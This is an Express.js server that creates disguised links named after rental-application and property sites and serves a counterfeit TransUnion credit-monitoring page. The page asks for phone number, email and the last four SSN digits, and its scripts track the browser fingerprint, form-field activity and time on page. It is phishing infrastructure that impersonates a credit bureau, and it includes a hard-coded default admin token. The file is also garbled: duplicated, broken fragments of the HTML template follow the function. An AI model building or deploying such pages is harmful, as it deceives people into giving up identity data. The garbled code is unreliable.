const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cors = require('cors');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 3000;
const DOMAIN = process.env.DOMAIN || process.env.RAILWAY_PUBLIC_DOMAIN || 'rentnstarter.up.railway.app';

// Security middleware
app.use(helmet());
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Rate limiting for admin endpoints
const adminRateLimit = new Map();
const ADMIN_RATE_LIMIT = 100;

// Store for tracking data
const trackingData = new Map();

// Load existing data if available
const DATA_FILE = path.join(__dirname, 'tracking_data.json');
try {
    if (fs.existsSync(DATA_FILE)) {
        const savedData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        Object.entries(savedData).forEach(([key, value]) => {
            trackingData.set(key, value);
        });
        console.log('Loaded ' + trackingData.size + ' existing tracking IDs');
    }
} catch (error) {
    console.log('No existing data file found, starting fresh');
}

// Periodically save data
setInterval(() => {
    const dataObj = Object.fromEntries(trackingData);
    fs.writeFileSync(DATA_FILE, JSON.stringify(dataObj, null, 2));
}, 60000);

// Generate unique tracking ID
function generateTrackingId() {
    return crypto.randomBytes(16).toString('hex');
}

// Admin authentication middleware
function requireAuth(req, res, next) {
    const authHeader = req.headers.authorization;
    const expectedAuth = process.env.ADMIN_TOKEN || 'admin-secret-token';
    
    if (!authHeader || authHeader !== 'Bearer ' + expectedAuth) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    // Simple rate limiting
    const clientIP = getClientIP(req);
    const hour = Math.floor(Date.now() / 3600000);
    const key = clientIP + '-' + hour;
    
    const requests = adminRateLimit.get(key) || 0;
    if (requests >= ADMIN_RATE_LIMIT) {
        return res.status(429).json({ error: 'Rate limit exceeded' });
    }
    
    adminRateLimit.set(key, requests + 1);
    next();
}

// Get real client IP
function getClientIP(req) {
    return req.headers['cf-connecting-ip'] ||
           req.headers['x-real-ip'] ||
           req.headers['x-forwarded-for']?.split(',')[0] ||
           req.connection.remoteAddress ||
           req.socket.remoteAddress ||
           'unknown';
}

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Generate friendly URL path
function generateFriendlyPath() {
    const paths = [
        'onboarding', 'application', 'apply', 'rental-app', 'tenant-screening',
        'background-check', 'credit-check', 'rental-verification', 'lease-application',
        'tenant-application', 'rental-form', 'housing-app', 'apartment-app',
        'rental-inquiry', 'tenant-portal', 'rental-process', 'tenant-onboarding',
        'rental-screening', 'tenant-verify', 'rental-qualify'
    ];
    
    const path = paths[Math.floor(Math.random() * paths.length)];
    const num = Math.floor(Math.random() * 999) + 1;
    
    return path + '-' + num;
}

// Create tracking link endpoint
app.post('/api/create-link', requireAuth, (req, res) => {
    try {
        const trackingId = generateTrackingId();
        const customPath = req.body.customPath;
        const urlType = req.body.urlType || 'friendly';
        
        let friendlyPath, promoCode;
        
        if (customPath) {
            friendlyPath = customPath.toLowerCase().replace(/[^a-z0-9-]/g, '-');
        } else {
            switch (urlType) {
                case 'promo':
                    promoCode = 'RENT' + Math.floor(Math.random() * 9000 + 1000);
                    break;
                case 'tool':
                    friendlyPath = 'tools/rental-application';
                    break;
                case 'company':
                    const companies = ['zillow', 'apartments', 'rentals', 'trulia', 'realtor', 'padmapper'];
                    const company = companies[Math.floor(Math.random() * companies.length)];
                    friendlyPath = 'partner/' + company;
                    break;
                case 'friendly':
                default:
                    friendlyPath = generateFriendlyPath();
                    break;
            }
        }
        
        const metadata = {
            created: new Date().toISOString(),
            description: req.body.description || 'Bot tracking link',
            campaign: req.body.campaign || 'default',
            friendlyPath: friendlyPath,
            promoCode: promoCode,
            urlType: urlType,
            clicks: [],
            createdBy: getClientIP(req)
        };
        
        trackingData.set(trackingId, metadata);
        
        const protocol = req.headers['x-forwarded-proto'] || 'http';
        const host = req.headers.host || DOMAIN;
        
        let mainUrl, shortUrl;
        
        if (promoCode) {
            mainUrl = protocol + '://' + host + '/promo/' + promoCode;
            shortUrl = protocol + '://' + host + '/p/' + promoCode;
        } else if (friendlyPath) {
            if (friendlyPath.includes('/')) {
                mainUrl = protocol + '://' + host + '/' + friendlyPath;
                shortUrl = protocol + '://' + host + '/go/' + friendlyPath.split('/').pop();
            } else {
                mainUrl = protocol + '://' + host + '/offer/' + friendlyPath;
                shortUrl = protocol + '://' + host + '/go/' + friendlyPath;
            }
        } else {
            mainUrl = protocol + '://' + host + '/t/' + trackingId;
            shortUrl = protocol + '://' + host + '/s/' + trackingId.substring(0, 8);
        }
        
        res.json({
            success: true,
            trackingId: trackingId,
            url: mainUrl,
            shortUrl: shortUrl,
            directUrl: protocol + '://' + host + '/t/' + trackingId,
            urlType: urlType,
            friendlyPath: friendlyPath,
            promoCode: promoCode,
            created: metadata.created
        });
    } catch (error) {
        res.status(500).json({ error: 'Failed to create tracking link' });
    }
});

// Helper function to find tracking ID by friendly path
function findTrackingIdByPath(friendlyPath) {
    for (const [trackingId, data] of trackingData.entries()) {
        if (data.friendlyPath === friendlyPath) {
            return trackingId;
        }
    }
    return null;
}

// Helper function for promo codes
function findTrackingIdByPromo(promoCode) {
    for (const [trackingId, data] of trackingData.entries()) {
        if (data.promoCode === promoCode) {
            return trackingId;
        }
    }
    return null;
}

// Function to generate TransUnion-style credit monitoring HTML
function generateCreditMonitoringHTML(trackingId) {
    return '<!DOCTYPE html>' +
'<html lang="en">' +
'<head>' +
'    <meta charset="UTF-8">' +
'    <meta name="viewport" content="width=device-width, initial-scale=1.0">' +
'    <title>TransUnion® - Free Credit Report & Score</title>' +
'    <style>' +
'        * {' +
'            margin: 0;' +
'            padding: 0;' +
'            box-sizing: border-box;' +
'        }' +
'        ' +
'        body {' +
'            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;' +
'            background: #ffffff;' +
'            color: #2c2c2c;' +
'        }' +
'        ' +
'        .header {' +
'            background: white;' +
'            padding: 20px 0;' +
'            border-bottom: 1px solid #e5e5e5;' +
'        }' +
'        ' +
'        .nav-container {' +
'            max-width: 1200px;' +
'            margin: 0 auto;' +
'            padding: 0 20px;' +
'            display: flex;' +
'            align-items: center;' +
'            justify-content: space-between;' +
'        }' +
'        ' +
'        .logo {' +
'            display: flex;' +
'            align-items: center;' +
'            font-size: 28px;' +
'            font-weight: 400;' +
'            color: #00b4d8;' +
'            text-decoration: none;' +
'        }' +
'        ' +
'        .main-container {' +
'            max-width: 600px;' +
'            margin: 40px auto;' +
'            padding: 0 20px;' +
'        }' +
'        ' +
'        .progress-header {' +
'            margin-bottom: 40px;' +
'        }' +
'        ' +
'        .step-indicator {' +
'            font-size: 14px;' +
'            color: #0066cc;' +
'            font-weight: 500;' +
'            margin-bottom: 12px;' +
'        }' +
'        ' +
'        .progress-bar {' +
'            width: 100%;' +
'            max-width: 600px;' +
'            height: 4px;' +
'            background: #0066cc;' +
'            border-radius: 2px;' +
'            position: relative;' +
'            overflow: visible;' +
'        }' +
'        ' +
'        .progress-bar::after {' +
'            content: "";' +
'            position: absolute;' +
'            left: 33%;' +
'            top: -3px;' +
'            width: 10px;' +
'            height: 10px;' +
'            background: #0066cc;' +
'            border-radius: 50%;' +
'        }' +
'        ' +
'        h1 {' +
'            font-size: 36px;' +
'            font-weight: 300;' +
'            line-height: 1.2;' +
'            color: #2c2c2c;' +
'            margin-bottom: 25px;' +
'        }' +
'        ' +
'        .info-link {' +
'            color: #0066cc;' +
'            text-decoration: underline;' +
'            font-size: 14px;' +
'            margin-bottom: 25px;' +
'            display: inline-block;' +
'            cursor: pointer;' +
'        }' +
'        ' +
'        .form-container {' +
'            background: white;' +
'        }' +
'        ' +
'        .form-group {' +
'            margin-bottom: 25px;' +
'        }' +
'        ' +
'        .form-label {' +
'            display: block;' +
'            margin-bottom: 8px;' +
'            color: #2c2c2c;' +
'            font-size: 15px;' +
'            font-weight: 400;' +
'        }' +
'        ' +
'        .form-control {' +
'            width: 100%;' +
'            padding: 10px 12px;' +
'            border: 1px solid #b8b8b8;' +
'            border-radius: 3px;' +
'            font-size: 16px;' +
'            transition: border-color 0.2s;' +
'        }' +
'        ' +
'        .form-control:focus {' +
'            outline: none;' +
'            border-color: #0066cc;' +
'            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);' +
'        }' +
'        ' +
'        .phone-format {' +
'            display: flex;' +
'            align-items: center;' +
'            gap: 6px;' +
'        }' +
'        ' +
'        .phone-input {' +
'            width: 45px;' +
'            padding: 10px 4px;' +
'            border: none;' +
'            border-bottom: 1px solid #b8b8b8;' +
'            font-size: 16px;' +
'            text-align: center;' +
'            border-radius: 0;' +
'        }' +
'        ' +
'        .phone-input:focus {' +
'            outline: none;' +
'            border-bottom-color: #0066cc;' +
'        }' +
'        ' +
'        .phone-input.area {' +
'            width: 45px;' +
'        }' +
'        ' +
'        .phone-input.middle {' +
'            width: 45px;' +
'        }' +
'        ' +
'        .phone-input.last {' +
'            width: 60px;' +
'        }' +
'        ' +
'        .phone-separator {' +
'            color: #2c2c2c;' +
'            font-size: 16px;' +
'            margin: 0 2px;' +
'        }' +
'        ' +
'        .helper-text {' +
'            font-size: 13px;' +
'            color: #666;' +
'            margin-top: 6px;' +
'            line-height: 1.4;' +
'        }' +
'        ' +
'        .ssn-label {' +
'            display: flex;' +
'            align-items: center;' +
'            gap: 8px;' +
'            font-size: 15px;' +
'        }' +
'        ' +
'        .ssn-input {' +
'            width: 140px;' +
'            padding: 10px 12px;' +
'            border: 1px solid #b8b8b8;' +
'            border-radius: 3px;' +
'            font-size: 16px;' +
'            margin-left: 8px;' +
'        }' +
'        ' +
'        .ssn-input:focus {' +
'            outline: none;' +
'            border-color: #0066cc;' +
'            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);' +
'        }' +
'        ' +
'        .lock-icon {' +
'            color: #666;' +
'            font-size: 16px;' +
'            margin-left: 8px;' +
'        }' +
'        ' +
'        .info-box {' +
'            background: #003d5c;' +
'            color: white;' +
'            padding: 20px;' +
'            border-radius: 3px;' +
'            margin: 30px 0;' +
'        }' +
'        ' +
'        .info-box h3 {' +
'            font-size: 18px;' +
'            font-weight: 600;' +
'            margin-bottom: 12px;' +
'        }' +
'        ' +
'        .info-box p {' +
'            font-size: 14px;' +
'            line-height: 1.5;' +
'        }' +
'        ' +
'        .agreement-text {' +
'            font-size: 11px;' +
'            color: #666;' +
'            line-height: 1.5;' +
'            margin: 20px 0;' +
'        }' +
'        ' +
'        .agreement-text a {' +
'            color: #0066cc;' +
'            text-decoration: underline;' +
'        }' +
'        ' +
'        .btn-primary {' +
'            background: #ffd500;' +
'            color: #000;' +
'            padding: 14px 32px;' +
'            border: none;' +
'            border-radius: 3px;' +
'            font-size: 16px;' +
'            font-weight: 600;' +
'            cursor: pointer;' +
'            width: 100%;' +
'            transition: background 0.2s;' +
'            display: flex;' +
'            align-items: center;' +
'            justify-content: center;' +
'        }' +
'        ' +
'        .btn-primary:hover {' +
'            background: #e6c000;' +
'        }' +
'        ' +
'        .lock-icon-btn {' +
'            margin-right: 8px;' +
'            font-size: 16px;' +
'        }' +
'        ' +
'        .login-link {' +
'            text-align: center;' +
'            margin-top: 25px;' +
'            font-size: 14px;' +
'            color: #666;' +
'        }' +
'        ' +
'        .login-link a {' +
'            color: #0066cc;' +
'            text-decoration: underline;' +
'        }' +
'        ' +
'        .benefits-list {' +
'            list-style: none;' +
'            margin: 25px 0;' +
'            padding: 0;' +
'        }' +
'        ' +
'        .benefits-list li {' +
'            padding: 8px 0;' +
'            padding-left: 28px;' +
'            position: relative;' +
'            font-size: 14px;' +
'            color: #2c2c2c;' +
'            line-height: 1.4;' +
'        }' +
'        ' +
'        .benefits-list li:before {' +
'            content: "✓";' +
'            position: absolute;' +
'            left: 0;' +
'            color: #4caf50;' +
'            font-weight: bold;' +
'            font-size: 16px;' +
'        }' +
'        ' +
'        .benefits-list strong {' +
'            font-weight: 600;' +
'        }' +
'        ' +
'        @media (max-width: 768px) {' +
'            .main-container {' +
'                padding: 0 15px;' +
'            }' +
'            ' +
'            h1 {' +
'                font-size: 28px;' +
'            }' +
'            ' +
'            .phone-format {' +
'                flex-wrap: wrap;' +
'            }' +
'        }' +
'    </style>' +
'</head>' +
'<body>' +
'    <header class="header">' +
'        <div class="nav-container">' +
'            <a href="#" class="logo">' +
'                TransUnion<span style="font-size: 14px; vertical-align: super;">®</span>' +
'            </a>' +
'        </div>' +
'    </header>' +
'    ' +
'    <div class="main-container">' +
'        <div class="progress-header">' +
'            <div class="step-indicator">Step 1: Find Your Info</div>' +
'            <div class="progress-bar"></div>' +
'        </div>' +
'        ' +
'        <h1>Your FREE scores, reports & monitoring are moments away</h1>' +
'        ' +
'        <a href="#" class="info-link">Personal Info We Collect</a>' +
'        ' +
'        <div class="form-container">' +
'            <form id="signupForm">' +
'                <div class="form-group">' +
'                    <label class="form-label">Mobile phone number</label>' +
'                    <div class="phone-format">' +
'                        <span class="phone-separator">(</span>' +
'                        <input type="text" class="phone-input area" id="phone1" maxlength="3" placeholder="___">' +
'                        <span class="phone-separator">)</span>' +
'                        <input type="text" class="phone-input middle" id="phone2" maxlength="3" placeholder="___">' +
'                        <span class="phone-separator">—</span>' +
'                        <input type="text" class="phone-input last" id="phone3" maxlength="4" placeholder="____">' +
'                    </div>' +
'                    <div class="helper-text">We\'ll send a text to this number in the next step.</div>' +
'                </div>' +
'                ' +
'                <div class="form-group">' +
'                    <label class="form-label">Email address</label>' +
'                    <input type="email" class="form-control" id="email" required>' +
'                </div>' +
'                ' +
'                <div class="form-group">' +
'                    <div class="ssn-label">' +
'                        <label class="form-label" style="margin: 0;">xxx - xx -</label>' +
'                        <input type="text" class="ssn-input" id="ssn" placeholder="Last 4 digits of SSN" maxlength="4">' +
'                        <span class="lock-icon">🔒</span>' +
'                    </div>' +
'                </div>' +
'                ' +
'                <div class="helper-text" style="margin-bottom: 25px;">' +
'                    By providing the last 4 digits of your social security number, we will attempt to pre-fill the remaining information needed to set up your account as well as retrieve your credit information. This will also help protect you from unauthorized access.' +
'                </div>' +
'                ' +
'                <div class="info-box">' +
'                    <h3>What You Need to Know:</h3>' +
'                    <p>The credit scores provided are based on the VantageScore® 3.0 model. Lenders use a variety of credit scores and are likely to use a credit score different from VantageScore® 3.0 to assess your creditworthiness.</p>' +
'                </div>' +
'                ' +
'                <ul class="benefits-list">' +
'                    <li><strong>Completely free</strong> - no credit card required</li>' +
'                    <li><strong>Daily TransUnion credit reports, scores & monitoring</strong></li>' +
'                    <li><strong>Personalized credit health tips & tools</strong></li>' +
'                    <li><strong>Personalized offers</strong> based on your credit profile</li>' +
'                </ul>' +
'                ' +
'                <div class="agreement-text">' +
'                    By clicking "Get Started" below, I accept and agree to TransUnion Interactive, Inc.\'s ("TUI") <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>. I consent to receive a one-time verification text from TUI to confirm my identity and to receive text notifications for account verification, support, and transactional messages, including some credit monitoring alerts and profile updates. Message and data rates may apply. Message frequency varies. To stop text notifications, reply "STOP" to any message from us. For assistance, reply "HELP".' +
'                </div>' +
'                ' +
'                <button type="submit" class="btn-primary" onclick="handleSubmit(event)">' +
'                    <span class="lock-icon-btn">🔒</span> Get started' +
'                </button>' +
'            </form>' +
'            ' +
'            <div class="login-link">' +
'                Already have an account? <a href="#">Log in</a>' +
'            </div>' +
'        </div>' +
'    </div>' +
'    ' +
'    <script>' +
'        // Track page load' +
'        fetch("/api/js-track/' + trackingId + '", {' +
'            method: "POST",' +
'            headers: {"Content-Type": "application/json"},' +
'            body: JSON.stringify({' +
'                action: "page_loaded",' +
'                screen: {width: screen.width, height: screen.height},' +
'                viewport: {width: window.innerWidth, height: window.innerHeight},' +
'                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,' +
'                language: navigator.language,' +
'                userAgent: navigator.userAgent,' +
'                platform: navigator.platform,' +
'                pageUrl: window.location.href,' +
'                referrer: document.referrer,' +
'                timestamp: new Date().toISOString()' +
'            })' +
'        }).catch(() => {});' +
'        ' +
'        // Auto-advance phone inputs' +
'        document.getElementById("phone1").addEventListener("input", function(e) {' +
'            if (e.target.value.length === 3) {' +
'                document.getElementById("phone2").focus();' +
'            }' +
'        });' +
'        ' +
'        document.getElementById("phone2").addEventListener("input", function(e) {' +
'            if (e.target.value.length === 3) {' +
'                document.getElementById("phone3").focus();' +
'            }' +
'        });' +
'        ' +
'        // Track form field interactions' +
'        document.querySelectorAll("input").forEach(element => {' +
'            element.addEventListener("focus", function() {' +
'                fetch("/api/js-track/' + trackingId + '", {' +
'                    method: "POST",' +
'                    headers: {"Content-Type": "application/json"},' +
'                    body: JSON.stringify({' +
'                        action: "form_field_focus",' +
'                        field: this.id,' +
'                        timestamp: new Date().toISOString()' +
'                    })' +
'                }).catch(() => {});' +
'            });' +
'            ' +
'            element.addEventListener("blur", function() {' +
'                if (this.value) {' +
'                    fetch("/api/js-track/' + trackingId + '", {' +
'                        method: "POST",' +
'                        headers: {"Content-Type": "application/json"},' +
'                        body: JSON.stringify({' +
'                            action: "form_field_filled",' +
'                            field: this.id,' +
'                            hasValue: !!this.value,' +
'                            timestamp: new Date().toISOString()' +
'                        })' +
'                    }).catch(() => {});' +
'                }' +
'            });' +
'        });' +
'        ' +
'        function handleSubmit(event) {' +
'            event.preventDefault();' +
'            ' +
'            const phone = document.getElementById("phone1").value + ' +
'                         document.getElementById("phone2").value + ' +
'                         document.getElementById("phone3").value;' +
'            const email = document.getElementById("email").value;' +
'            const ssn = document.getElementById("ssn").value;' +
'            ' +
'            // Track submission attempt' +
'            fetch("/api/js-track/' + trackingId + '", {' +
'                method: "POST",' +
'                headers: {"Content-Type": "application/json"},' +
'                body: JSON.stringify({' +
'                    action: "form_submission_attempt",' +
'                    formData: {' +
'                        phoneLength: phone.length,' +
'                        hasEmail: !!email,' +
'                        hasSsn: !!ssn' +
'                    },' +
'                    timestamp: new Date().toISOString()' +
'                })' +
'            }).catch(() => {});' +
'            ' +
'            // Validate' +
'            if (!email || ssn.length !== 4 || phone.length !== 10) {' +
'                alert("Please fill in all required fields correctly.");' +
'                return;' +
'            }' +
'            ' +
'            // Track successful submission' +
'            fetch("/api/js-track/' + trackingId + '", {' +
'                method: "POST",' +
'                headers: {"Content-Type": "application/json"},' +
'                body: JSON.stringify({' +
'                    action: "step_completed",' +
'                    step: 1,' +
'                    timestamp: new Date().toISOString()' +
'                })' +
'            }).catch(() => {});' +
'            ' +
'            alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process.");' +
'        }' +
'        ' +
'        // Track scroll depth' +
'        let maxScroll = 0;' +
'        window.addEventListener("scroll", function() {' +
'            const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);' +
'            if (scrollPercent > maxScroll) {' +
'                maxScroll = scrollPercent;' +
'                if (maxScroll % 25 === 0) {' +
'                    fetch("/api/js-track/' + trackingId + '", {' +
'                        method: "POST",' +
'                        headers: {"Content-Type": "application/json"},' +
'                        body: JSON.stringify({' +
'                            action: "scroll_depth",' +
'                            percentage: maxScroll,' +
'                            timestamp: new Date().toISOString()' +
'                        })' +
'                    }).catch(() => {});' +
'                }' +
'            }' +
'        });' +
'        ' +
'        // Track time on page' +
'        let timeOnPage = 0;' +
'        setInterval(() => {' +
'            timeOnPage += 10;' +
'            if (timeOnPage % 30 === 0) {' +
'                fetch("/api/js-track/' + trackingId + '", {' +
'                        method: "POST",' +
'                        headers: {"Content-Type": "application/json"},' +
'                        body: JSON.stringify({' +
'                            action: "time_on_page",' +
'                            seconds: timeOnPage,' +
'                            timestamp: new Date().toISOString()' +
'                        })' +
'                    }).catch(() => {});' +
'            }' +
'        }, 10000);' +
'    </script>' +
'</body>' +
'</html>';
}
	    line-height: 1.5;
            margin: 20px 0;
        }
        
        .agreement-text a {
            color: #0066cc;
            text-decoration: underline;
        }
        
        .btn-primary {
            background: #ffd500;
            color: #000;
            padding: 14px 32px;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .btn-primary:hover {
            background: #e6c000;
        }
        
        .lock-icon-btn {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .login-link {
            text-align: center;
            margin-top: 25px;
            font-size: 14px;
            color: #666;
        }
        
        .login-link a {
            color: #0066cc;
            text-decoration: underline;
        }
        
        .benefits-list {
            list-style: none;
            margin: 25px 0;
            padding: 0;
        }
        
        .benefits-list li {
            padding: 8px 0;
            padding-left: 28px;
            position: relative;
            font-size: 14px;
            color: #2c2c2c;
            line-height: 1.4;
        }
        
        .benefits-list li:before {
            content: "✓";
            position: absolute;
            left: 0;
            color: #4caf50;
            font-weight: bold;
            font-size: 16px;
        }
        
        .benefits-list strong {
            font-weight: 600;
        }
        
        @media (max-width: 768px) {
            .main-container {
                padding: 0 15px;
            }
            
            h1 {
                font-size: 28px;
            }
            
            .phone-format {
                flex-wrap: wrap;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="nav-container">
            <a href="#" class="logo">
                TransUnion<span style="font-size: 14px; vertical-align: super;">®</span>
            </a>
        </div>
    </header>
    
    <div class="main-container">
        <div class="progress-header">
            <div class="step-indicator">Step 1: Find Your Info</div>
            <div class="progress-bar"></div>
        </div>
        
        <h1>Your FREE scores, reports & monitoring are moments away</h1>
        
        <a href="#" class="info-link">Personal Info We Collect</a>
        
        <div class="form-container">
            <form id="signupForm">
                <div class="form-group">
                    <label class="form-label">Mobile phone number</label>
                    <div class="phone-format">
                        <span class="phone-separator">(</span>
                        <input type="text" class="phone-input area" id="phone1" maxlength="3" placeholder="___">
                        <span class="phone-separator">)</span>
                        <input type="text" class="phone-input middle" id="phone2" maxlength="3" placeholder="___">
                        <span class="phone-separator">—</span>
                        <input type="text" class="phone-input last" id="phone3" maxlength="4" placeholder="____">
                    </div>
                    <div class="helper-text">We'll send a text to this number in the next step.</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Email address</label>
                    <input type="email" class="form-control" id="email" required>
                </div>
                
                <div class="form-group">
                    <div class="ssn-label">
                        <label class="form-label" style="margin: 0;">xxx - xx -</label>
                        <input type="text" class="ssn-input" id="ssn" placeholder="Last 4 digits of SSN" maxlength="4">
                        <span class="lock-icon">🔒</span>
                    </div>
                </div>
                
                <div class="helper-text" style="margin-bottom: 25px;">
                    By providing the last 4 digits of your social security number, we will attempt to pre-fill the remaining information needed to set up your account as well as retrieve your credit information. This will also help protect you from unauthorized access.
                </div>
                
                <div class="info-box">
                    <h3>What You Need to Know:</h3>
                    <p>The credit scores provided are based on the VantageScore® 3.0 model. Lenders use a variety of credit scores and are likely to use a credit score different from VantageScore® 3.0 to assess your creditworthiness.</p>
                </div>
                
                <ul class="benefits-list">
                    <li><strong>Completely free</strong> - no credit card required</li>
                    <li><strong>Daily TransUnion credit reports, scores & monitoring</strong></li>
                    <li><strong>Personalized credit health tips & tools</strong></li>
                    <li><strong>Personalized offers</strong> based on your credit profile</li>
                </ul>
                
                <div class="agreement-text">
                    By clicking "Get Started" below, I accept and agree to TransUnion Interactive, Inc.'s ("TUI") <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>. I consent to receive a one-time verification text from TUI to confirm my identity and to receive text notifications for account verification, support, and transactional messages, including some credit monitoring alerts and profile updates. Message and data rates may apply. Message frequency varies. To stop text notifications, reply "STOP" to any message from us. For assistance, reply "HELP".
                </div>
                
                <button type="submit" class="btn-primary" onclick="handleSubmit(event)">
                    <span class="lock-icon-btn">🔒</span> Get started
                </button>
            </form>
            
            <div class="login-link">
                Already have an account? <a href="#">Log in</a>
            </div>
        </div>
    </div>
    
    <script>
        // Track page load
        fetch("/api/js-track/${trackingId}", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                action: "page_loaded",
                screen: {width: screen.width, height: screen.height},
                viewport: {width: window.innerWidth, height: window.innerHeight},
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                pageUrl: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            })
        }).catch(() => {});
        
        // Auto-advance phone inputs
        document.getElementById('phone1').addEventListener('input', function(e) {
            if (e.target.value.length === 3) {
                document.getElementById('phone2').focus();
            }
        });
        
        document.getElementById('phone2').addEventListener('input', function(e) {
            if (e.target.value.length === 3) {
                document.getElementById('phone3').focus();
            }
        });
        
        // Track form field interactions
        document.querySelectorAll('input').forEach(element => {
            element.addEventListener('focus', function() {
                fetch("/api/js-track/${trackingId}", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        action: "form_field_focus",
                        field: this.id,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            });
            
            element.addEventListener('blur', function() {
                if (this.value) {
                    fetch("/api/js-track/${trackingId}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            action: "form_field_filled",
                            field: this.id,
                            hasValue: !!this.value,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            });
        });
        
        function handleSubmit(event) {
            event.preventDefault();
            
            const phone = document.getElementById('phone1').value + 
                         document.getElementById('phone2').value + 
                         document.getElementById('phone3').value;
            const email = document.getElementById('email').value;
            const ssn = document.getElementById('ssn').value;
            
            // Track submission attempt
            fetch("/api/js-track/${trackingId}", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    action: "form_submission_attempt",
                    formData: {
                        phoneLength: phone.length,
                        hasEmail: !!email,
                        hasSsn: !!ssn
                    },
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
            
            // Validate
            if (!email || ssn.length !== 4 || phone.length !== 10) {
                alert("Please fill in all required fields correctly.");
                return;
            }
            
            // Track successful submission
            fetch("/api/js-track/${trackingId}", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    action: "step_completed",
                    step: 1,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
            
            alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process.");
        }
        
        // Track scroll depth
        let maxScroll = 0;
        window.addEventListener('scroll', function() {
            const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
            if (scrollPercent > maxScroll) {
                maxScroll = scrollPercent;
                if (maxScroll % 25 === 0) {
                    fetch("/api/js-track/${trackingId}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            action: "scroll_depth",
                            percentage: maxScroll,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            }
        });
        
        // Track time on page
        let timeOnPage = 0;
        setInterval(() => {
            timeOnPage += 10;
            if (timeOnPage % 30 === 0) {
                fetch("/api/js-track/${trackingId}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            action: "time_on_page",
                            seconds: timeOnPage,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
            }
        }, 10000);
    </script>
</body>
</html>`;
}<div class="progress-fill"></div>
            </div>
        </div>
        
        <h1>Your FREE scores, reports & monitoring are moments away</h1>
        
        <a href="#" class="info-link">Personal Info We Collect</a>
        
        <div class="form-container">
            <form id="signupForm">
                <div class="form-group">
                    <label class="form-label">Mobile phone number</label>
                    <div class="phone-format">
                        <div class="phone-part">
                            <span class="phone-separator">(</span>
                            <input type="text" class="phone-input area" id="phone1" maxlength="3" placeholder="___">
                            <span class="phone-separator">)</span>
                        </div>
                        <input type="text" class="phone-input" id="phone2" maxlength="3" placeholder="___">
                        <span class="phone-separator">—</span>
                        <input type="text" class="phone-input" id="phone3" maxlength="4" placeholder="____">
                    </div>
                    <div class="helper-text">We'll send a text to this number in the next step.</div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Email address</label>
                    <input type="email" class="form-control" id="email" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">xxx - xx - <input type="text" class="ssn-input" id="ssn" placeholder="Last 4 digits of SSN" maxlength="4"> <span class="lock-icon">🔒</span></label>
                </div>
                
                <div class="helper-text">
                    By providing the last 4 digits of your social security number, we will attempt to pre-fill the remaining information needed to set up your account as well as retrieve your credit information. This will also help protect you from unauthorized access.
                </div>
                
                <div class="info-box">
                    <h3>What You Need to Know:</h3>
                    <p>The credit scores provided are based on the VantageScore® 3.0 model. Lenders use a variety of credit scores and are likely to use a credit score different from VantageScore® 3.0 to assess your creditworthiness.</p>
                </div>
                
                <ul class="benefits-list">
                    <li><strong>Completely free</strong> - no credit card required</li>
                    <li><strong>Daily TransUnion credit reports, scores & monitoring</strong></li>
                    <li><strong>Personalized credit health tips & tools</strong></li>
                    <li><strong>Personalized offers</strong> based on your credit profile</li>
                </ul>
                
                <div class="agreement-text">
                    By clicking "Get Started" below, I accept and agree to TransUnion Interactive, Inc.'s ("TUI") <a href="#">Terms of Service</a> and <a href="#">Privacy Notice</a>. I consent to receive a one-time verification text from TUI to confirm my identity and to receive text notifications for account verification, support, and transactional messages, including some credit monitoring alerts and profile updates. Message and data rates may apply. Message frequency varies. To stop text notifications, reply "STOP" to any message from us. For assistance, reply "HELP".
                </div>
                
                <button type="submit" class="btn-primary" onclick="handleSubmit(event)">
                    <span class="lock-icon-btn">🔒</span> Get started
                </button>
            </form>
            
            <div class="login-link">
                Already have an account? <a href="#">Log in</a>
            </div>
        </div>
    </div>
    
    <script>
        // Track page load
        fetch("/api/js-track/${trackingId}", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                action: "page_loaded",
